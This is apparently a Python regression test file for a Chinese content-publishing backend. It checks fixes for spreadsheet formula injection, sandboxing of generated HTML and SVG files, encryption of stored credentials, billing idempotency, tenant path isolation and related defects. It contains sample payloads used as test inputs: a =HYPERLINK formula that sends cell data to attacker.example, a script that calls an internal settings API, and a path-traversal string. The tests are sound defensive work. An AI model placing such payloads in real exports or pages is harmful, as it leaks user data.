"""交付硬化回归：审核报告列出的 P0 缺陷各自钉一条测试，防止回潮。

覆盖：
- 文档解析：.pptx 必须真的能解析（python-pptx 的 Slides/Shapes 不支持切片）
- 表格导出：客资/线索表不得把用户文本当 Excel 公式执行
- 发布质检：AI 质检不可用时必须 fail-closed，不能仅凭词库放行
- 客资邮件：收件地址不得有内置默认值，漏配时跳过而不是发往第三方
- 引擎唤醒：线程池线程调用 notify/broadcast 必须经事件循环安全投递
"""
import asyncio
import io
import json
import os
import pathlib
import tempfile
import threading
import unittest
from unittest.mock import patch

from app import docparse_worker, export, gate, llm, mailer, providers
from app.engine import Engine


def _build_pptx(path: str, slides: int = 3) -> None:
    from pptx import Presentation
    from pptx.util import Inches

    prs = Presentation()
    for index in range(slides):
        slide = prs.slides.add_slide(prs.slide_layouts[5])
        slide.shapes.title.text = f"第{index + 1}页标题"
        box = slide.shapes.add_textbox(Inches(1), Inches(2), Inches(4), Inches(1))
        box.text_frame.text = f"正文 body-{index + 1}"
    prs.save(path)


class DocumentParsingTests(unittest.TestCase):
    """python-pptx 的 Slides/Shapes 不支持切片，用切片会让所有 pptx 解析 100% 失败。"""

    def test_pptx_extraction_returns_every_slide_body(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "deck.pptx")
            _build_pptx(path, slides=3)

            text = docparse_worker.extract(pathlib.Path(path), ".pptx")

        for index in range(1, 4):
            self.assertIn(f"【第{index}页】", text)
            self.assertIn(f"body-{index}", text)

    def test_pptx_slides_do_not_support_slicing(self):
        """守住这条前提：一旦上游支持切片，这个测试会提醒我们可以简化实现。"""
        from pptx import Presentation

        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "deck.pptx")
            _build_pptx(path, slides=2)
            presentation = Presentation(path)
            with self.assertRaises(AttributeError):
                presentation.slides[:1]


class SpreadsheetInjectionTests(unittest.TestCase):
    """导出的客资/线索表含用户可控文本，不得被 Excel 当公式执行。"""

    def _first_column(self, blob: bytes) -> list:
        from openpyxl import load_workbook

        sheet = load_workbook(io.BytesIO(blob)).active
        return [row[0] for row in sheet.iter_rows(values_only=True)]

    def test_formula_prefixes_are_neutralised(self):
        rows = [
            {"备注": "=HYPERLINK(\"http://attacker.example/?x=\"&A1,\"点我\")"},
            {"备注": "+1+1"},
            {"备注": "-2-2"},
            {"备注": "@SUM(A1)"},
            {"备注": "正常内容"},
        ]
        values = self._first_column(export.rows_to_xlsx(rows, ["备注"]))

        self.assertEqual("备注", values[0])
        for value in values[1:5]:
            self.assertTrue(
                value.startswith("'"),
                f"公式前缀未被转义: {value!r}",
            )
        self.assertEqual("正常内容", values[5])

    def test_plain_text_is_not_mangled(self):
        values = self._first_column(
            export.rows_to_xlsx([{"手机": "13800000000"}], ["手机"])
        )
        self.assertEqual("13800000000", values[1])


class PublishGateFailClosedTests(unittest.TestCase):
    """发布前质检是对客户的合规承诺：模型不可用时必须拦下，不能静默放行。"""

    def _run_check(self, exc):
        async def _boom(*args, **kwargs):
            raise exc

        with patch.object(providers, "call_text_json", _boom):
            return asyncio.run(
                gate.check(
                    title="标题",
                    body="一段没有命中任何敏感词的普通正文内容。",
                    platforms=["小红书"],
                )
            )

    def test_provider_failure_blocks_publication(self):
        for exc in (
            llm.LLMError("upstream down"),
            providers.ProviderError("upstream down"),
        ):
            with self.subTest(exc=type(exc).__name__):
                result = self._run_check(exc)

                self.assertFalse(
                    result["passed"],
                    "AI 质检失败时不得放行",
                )
                severities = [i.get("severity") for i in result["issues"]]
                self.assertIn("高", severities)
                self.assertIn("质检未完成", result["report"])

    def test_failure_report_is_distinguishable_from_real_violation(self):
        """老板要能分清「内容违规」和「质检没跑成」，否则会误判自己的稿子。"""
        result = self._run_check(providers.ProviderError("down"))
        self.assertNotIn("存在高风险问题", result["report"])


class LeadMailRecipientTests(unittest.TestCase):
    """收件地址绝不能有内置默认值：漏配即把客户客资发往第三方邮箱。"""

    def test_module_has_no_builtin_recipient_address(self):
        source = pathlib.Path(mailer.__file__).read_text(encoding="utf-8")
        self.assertNotIn("@qq.com\"", source)
        self.assertNotIn("@qq.com'", source)
        self.assertFalse(hasattr(mailer, "LEAD_TO"))

    def _send_with(self, settings):
        sent = {}

        class _Smtp:
            def __init__(self, *args, **kwargs):
                sent["host"] = args[0] if args else None

            def __enter__(self):
                return self

            def __exit__(self, *args):
                return False

            def login(self, *args):
                pass

            def sendmail(self, sender, to, body):
                sent["to"] = to

        with (
            patch.object(mailer.db, "get_setting", side_effect=settings.get),
            patch.object(
                mailer.secureconfig, "get_secret", return_value="authcode"
            ),
            patch.object(mailer.smtplib, "SMTP_SSL", _Smtp),
        ):
            mailer._send("主题", "正文")
        return sent

    def test_missing_recipient_skips_send(self):
        sent = self._send_with({"smtp_user": "sender@example.com"})
        self.assertNotIn("to", sent)

    def test_missing_sender_skips_send(self):
        sent = self._send_with({"lead_email": "boss@example.com"})
        self.assertNotIn("to", sent)

    def test_fully_configured_sends_to_configured_recipient(self):
        sent = self._send_with({
            "smtp_user": "sender@example.com",
            "lead_email": "boss@example.com",
        })
        self.assertEqual(["boss@example.com"], sent["to"])


class DeliverableSandboxTests(unittest.TestCase):
    """演绎稿/封面 HTML 由不可信输入链驱动生成，同源直开即可拿会话调 /api/*。"""

    def setUp(self):
        from fastapi.testclient import TestClient

        from app import auth, db, main

        self.main = main
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.old_path = db.DB_PATH
        if db._conn is not None:
            db._conn.close()
        db._conn = None
        db.DB_PATH = os.path.join(self.tmp.name, "sandbox.db")
        db.conn()

        def _restore():
            if db._conn is not None:
                db._conn.close()
            db._conn = None
            db.DB_PATH = self.old_path

        self.addCleanup(_restore)

        db.insert("tenants", {"id": 2, "name": "租户甲"})
        uid = db.insert("users", {
            "tenant_id": 2, "username": "sandbox-owner",
            "password_hash": "fixture", "role": "owner",
        })
        self.job_id = db.insert("job", {
            "tenant_id": 2, "status": "done", "brief_json": "{}",
        })
        self.asset_dir = os.path.join(
            main.ROOT, "data", "assets", f"job{self.job_id}"
        )
        os.makedirs(self.asset_dir, exist_ok=True)
        self.client = TestClient(main.app)
        self.client.cookies.set("cc_sess", auth.make_session(uid))

    def _serve(self, name: str, body: str):
        path = os.path.join(self.asset_dir, name)
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(body)
        self.addCleanup(lambda: os.path.exists(path) and os.remove(path))
        return self.client.get(f"/files/job{self.job_id}/{name}")

    def test_html_deliverable_is_sandboxed(self):
        response = self._serve(
            "deck_v1.html",
            "<!DOCTYPE html><script>fetch('/api/settings')</script>",
        )
        self.assertEqual(200, response.status_code)
        self.assertIn(
            "sandbox",
            response.headers.get("content-security-policy", ""),
        )
        self.assertEqual(
            "nosniff", response.headers.get("x-content-type-options")
        )

    def test_svg_deliverable_is_sandboxed(self):
        response = self._serve(
            "media_v1_0.svg",
            "<svg xmlns='http://www.w3.org/2000/svg'><script/></svg>",
        )
        self.assertEqual(200, response.status_code)
        self.assertIn(
            "sandbox",
            response.headers.get("content-security-policy", ""),
        )

    def test_image_delivery_is_unchanged(self):
        """图片不需要沙箱，别给正常素材加无谓的限制。"""
        response = self._serve("media_v1_1.png", "\x89PNG fake")
        self.assertEqual(200, response.status_code)
        self.assertIsNone(response.headers.get("content-security-policy"))


class CredentialAtRestTests(unittest.TestCase):
    """平台登录态与 AppSecret 等同于账号本身,库文件泄露即被接管。"""

    def setUp(self):
        from app import db, secureconfig

        self.db = db
        self.secureconfig = secureconfig
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.old_path = db.DB_PATH
        if db._conn is not None:
            db._conn.close()
        db._conn = None
        db.DB_PATH = os.path.join(self.tmp.name, "creds.db")
        db.conn()

        def _restore():
            if db._conn is not None:
                db._conn.close()
            db._conn = None
            db.DB_PATH = self.old_path

        self.addCleanup(_restore)

        # 提供包装密钥,模拟生产形态(生产由 REQUIRE_CONFIG_KEY=1 强制)。
        # 必须是真高熵 token:低多样性的值会被 validate_secret_token 正确拒绝。
        import secrets
        key = secrets.token_urlsafe(48)
        old = os.environ.get(self.secureconfig.CONFIG_KEY_ENV)
        os.environ[self.secureconfig.CONFIG_KEY_ENV] = key

        def _restore_env():
            if old is None:
                os.environ.pop(self.secureconfig.CONFIG_KEY_ENV, None)
            else:
                os.environ[self.secureconfig.CONFIG_KEY_ENV] = old

        self.addCleanup(_restore_env)

    def _raw(self, key):
        return str(self.db.get_setting(key) or "")

    def test_wechat_appsecret_is_encrypted_at_rest(self):
        from app import wechat

        secret = "wx-app-secret-abcdef123456"
        wechat.set_conf(2, "wxappid001", secret)

        raw = self._raw("wechat_mp:2")
        self.assertNotIn(secret, raw, "AppSecret 明文落库")
        self.assertIn("wxappid001", raw, "AppID 不是机密,不必加密")
        # 读回时必须还原,否则接口直接不可用。
        self.assertEqual(secret, wechat.get_conf(2)["secret"])

    def test_matrix_cookie_is_encrypted_at_rest(self):
        from app import matrixpub

        cookie = "sessionid=" + "c" * 60
        matrixpub.add_account(2, "xhs", "小红书号", cookie)

        raw = self._raw("matrix_accounts:2")
        self.assertNotIn(cookie, raw, "平台登录态明文落库")
        self.assertEqual(cookie, matrixpub.accounts(2)[0]["cookie"])

    def test_legacy_plaintext_credentials_still_load(self):
        """升级前写入的明文历史值不能因为这次改动就打不开。"""
        from app import matrixpub

        legacy = "sessionid=" + "d" * 60
        self.db.set_setting("matrix_accounts:2", json.dumps(
            [{"id": "abc", "platform": "xhs", "name": "旧号", "cookie": legacy}]
        ))
        self.assertEqual(legacy, matrixpub.accounts(2)[0]["cookie"])

        # 下一次保存即自动升级为密文。
        matrixpub._save(2, matrixpub.accounts(2))
        self.assertNotIn(legacy, self._raw("matrix_accounts:2"))

    def test_undecryptable_cookie_degrades_to_expired(self):
        """密钥轮换/数据损坏不该让整个账号列表打不开。"""
        from app import matrixpub

        self.db.set_setting("matrix_accounts:2", json.dumps([{
            "id": "abc", "platform": "xhs", "name": "坏号",
            "cookie": self.secureconfig.ENCRYPTED_PREFIX + "not-a-valid-token",
        }]))
        accounts = matrixpub.accounts(2)
        self.assertEqual(1, len(accounts))
        self.assertEqual("", accounts[0]["cookie"])
        self.assertEqual("expired", accounts[0]["status"])

    def test_account_listing_never_exposes_cookies(self):
        from app import matrixpub

        matrixpub.add_account(2, "xhs", "小红书号", "sessionid=" + "e" * 60)
        for item in matrixpub.pub_list(2):
            self.assertNotIn("cookie", item)


class MatrixEnqueueValidationTests(unittest.TestCase):
    """入队不校验平台,发布协程会在 PLATFORMS[...] 抛 KeyError 并永久卡住任务。"""

    def setUp(self):
        from app import db

        self.db = db
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.old_path = db.DB_PATH
        if db._conn is not None:
            db._conn.close()
        db._conn = None
        db.DB_PATH = os.path.join(self.tmp.name, "enqueue.db")
        db.conn()

        def _restore():
            if db._conn is not None:
                db._conn.close()
            db._conn = None
            db.DB_PATH = self.old_path

        self.addCleanup(_restore)

    def test_unknown_platform_is_rejected_at_enqueue(self):
        from app import matrixpub

        with patch.object(matrixpub, "accounts", return_value=[
            {"id": "a1", "platform": "xhs"}
        ]):
            with self.assertRaises(ValueError):
                matrixpub.enqueue(2, "weibo", "a1", {})

    def test_account_platform_mismatch_is_rejected(self):
        from app import matrixpub

        with patch.object(matrixpub, "accounts", return_value=[
            {"id": "a1", "platform": "xhs"}
        ]):
            with self.assertRaises(ValueError):
                matrixpub.enqueue(2, "douyin", "a1", {})


class SubscriptionIdempotencyTests(unittest.TestCase):
    """套餐开通是入金路径:重复提交绝不能重复发点。"""

    def setUp(self):
        from app import db

        self.db = db
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.old_path = db.DB_PATH
        if db._conn is not None:
            db._conn.close()
        db._conn = None
        db.DB_PATH = os.path.join(self.tmp.name, "billing.db")
        db.conn()
        db.insert("tenants", {"id": 2, "name": "租户甲", "balance": 0})

        def _restore():
            if db._conn is not None:
                db._conn.close()
            db._conn = None
            db.DB_PATH = self.old_path

        self.addCleanup(_restore)

    def _balance(self):
        return self.db.one("SELECT balance FROM tenants WHERE id=2")["balance"]

    def _plan(self):
        from app import billing

        return billing.PLANS[0]["key"], billing.PERIODS[0]["key"]

    def test_same_order_id_grants_points_once(self):
        from app import billing

        plan, period = self._plan()
        first = billing.subscribe(2, plan, period, op_key="order-1")
        after_first = self._balance()
        self.assertGreater(after_first, 0)

        with self.assertRaises(ValueError):
            billing.subscribe(2, plan, period, op_key="order-1")

        self.assertEqual(after_first, self._balance(), "重复提交二次发点")
        self.assertEqual("order-1", first["op_key"])

    def test_distinct_orders_still_stack(self):
        from app import billing

        plan, period = self._plan()
        billing.subscribe(2, plan, period, op_key="order-1")
        one = self._balance()
        billing.subscribe(2, plan, period, op_key="order-2")
        self.assertGreater(self._balance(), one)

    def test_plan_and_points_move_together(self):
        """发点失败时套餐也不该生效,反之亦然。"""
        from app import billing

        plan, period = self._plan()
        with patch.object(billing, "grant", side_effect=RuntimeError("boom")):
            with self.assertRaises(RuntimeError):
                billing.subscribe(2, plan, period, op_key="order-x")

        row = self.db.one("SELECT plan,balance FROM tenants WHERE id=2")
        self.assertIn(row["plan"] or "", ("", None))
        self.assertEqual(0, row["balance"] or 0)
        # 失败的单号没有占位,可以重试。
        self.assertIsNone(
            self.db.one(
                "SELECT op_key FROM billing_operation WHERE op_key='order-x'"
            )
        )


class TenantClipIsolationTests(unittest.TestCase):
    """混剪片段必须收敛回本租户素材库,不能只信 params_json 里的路径。"""

    def setUp(self):
        from app import textvideo

        self.textvideo = textvideo
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.old_root = textvideo.CLIP_ROOT
        textvideo.CLIP_ROOT = os.path.join(self.tmp.name, "tvclips")
        self.addCleanup(lambda: setattr(textvideo, "CLIP_ROOT", self.old_root))

    def _make_clip(self, tid: int, name: str) -> str:
        directory = self.textvideo.clip_dir(tid)
        os.makedirs(directory, exist_ok=True)
        path = os.path.join(directory, name)
        with open(path, "wb") as handle:
            handle.write(b"\x00\x00\x00\x18ftypmp42")
        return path

    def test_own_clip_resolves(self):
        path = self._make_clip(2, "c_0123456789.mp4")
        self.assertEqual(path, self.textvideo.owned_clip_path(2, path))

    def test_other_tenant_clip_is_rejected(self):
        foreign = self._make_clip(3, "c_00feedbeef.mp4")
        self.assertIsNone(self.textvideo.owned_clip_path(2, foreign))

    def test_arbitrary_server_path_is_rejected(self):
        outside = os.path.join(self.tmp.name, "c_00deadbeef.mp4")
        with open(outside, "wb") as handle:
            handle.write(b"\x00")
        self.assertIsNone(self.textvideo.owned_clip_path(2, outside))

    def test_traversal_in_stored_path_is_rejected(self):
        self._make_clip(2, "c_00cafebabe.mp4")
        sneaky = os.path.join(
            self.textvideo.clip_dir(2), "..", "..", "c_00cafebabe.mp4"
        )
        self.assertIsNone(self.textvideo.owned_clip_path(2, sneaky))


class EngineCrossThreadWakeupTests(unittest.TestCase):
    """asyncio.Queue 不是线程安全的：同步路由跑在线程池，直接入队会丢唤醒。"""

    def test_notify_from_worker_thread_reaches_the_loop(self):
        async def scenario():
            engine = Engine()
            engine._loop = asyncio.get_running_loop()

            # 模拟 FastAPI 把同步路由派到线程池后调用 engine.notify()
            await asyncio.to_thread(engine.notify, 4242)
            job_id = await asyncio.wait_for(engine.queue.get(), timeout=2)
            return job_id

        self.assertEqual(4242, asyncio.run(scenario()))

    def test_broadcast_from_worker_thread_reaches_subscriber(self):
        async def scenario():
            engine = Engine()
            engine._loop = asyncio.get_running_loop()
            sub: asyncio.Queue = asyncio.Queue()
            engine.subscribers[sub] = (7, True)

            await asyncio.to_thread(
                engine.broadcast,
                {"type": "job_update", "tenant_id": 7, "job_id": 1},
            )
            return await asyncio.wait_for(sub.get(), timeout=2)

        event = asyncio.run(scenario())
        self.assertEqual("job_update", event["type"])

    def test_dispatch_before_start_runs_inline(self):
        """引擎尚未 start() 时仍在单线程装配阶段，直调不应报错。"""
        engine = Engine()
        seen = []
        engine._dispatch(seen.append, "value")
        self.assertEqual(["value"], seen)

    def test_dispatch_uses_threadsafe_path_off_loop(self):
        async def scenario():
            engine = Engine()
            engine._loop = asyncio.get_running_loop()
            loop_thread = threading.get_ident()
            observed = {}

            def record(value):
                observed["thread"] = threading.get_ident()
                observed["value"] = value

            await asyncio.to_thread(engine._dispatch, record, "x")
            await asyncio.sleep(0)
            return loop_thread, observed

        loop_thread, observed = asyncio.run(scenario())
        self.assertEqual("x", observed["value"])
        self.assertEqual(
            loop_thread,
            observed["thread"],
            "跨线程调用必须回到事件循环线程执行",
        )


if __name__ == "__main__":
    unittest.main()
